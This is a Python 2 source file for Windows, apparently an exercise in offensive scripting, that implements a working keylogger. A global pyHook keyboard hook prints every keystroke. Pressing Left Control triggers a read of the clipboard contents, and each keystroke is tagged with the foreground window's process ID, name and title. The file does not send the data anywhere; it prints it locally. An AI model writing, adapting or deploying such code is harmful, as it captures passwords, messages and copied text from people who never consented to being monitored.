# coding=utf-8
# 1. 接收键盘传入的数据
# 2. 编写回调函数KeyStroke用来打印键盘记录
# 3. 编写函数get_current_process（）用于打印当前窗口进程信息


from ctypes import *
import pyHook
import pythoncom
import win32clipboard as w

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
paste_data = None

def main():
    k = pyHook.HookManager()
    k.KeyDown = KeyStroke
    k.HookKeyboard()
    pythoncom.PumpMessages()

def KeyStroke(event):
    global current_window
    global paste_data
    if event.Window != current_window:
        current_window = event.Window
        get_current_process()

    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii),
    elif event.Key == "Lcontrol":
        w.OpenClipboard()
        paste_value = w.GetClipboardData()
        w.CloseClipboard()
        if paste_data != paste_value and paste_value != None:
            print "[PASTE--- %s ---]" % paste_value
            paste_data = paste_value
    else:
        print "[%s]" % event.Key
    return True

def get_current_process():
    hwnd = user32.GetForegroundWindow()
    pid = c_int(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id = pid.value
    buffer = create_string_buffer("\x00", 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, byref(buffer), 512)
    process_name = buffer.value
    window_title = create_string_buffer("\x00", 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
    window_title_name = window_title.value
    print
    print "[--- PID: %d - %s - %s ---]" % (process_id, process_name, window_title_name)
    print
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


if __name__ == "__main__":
    main()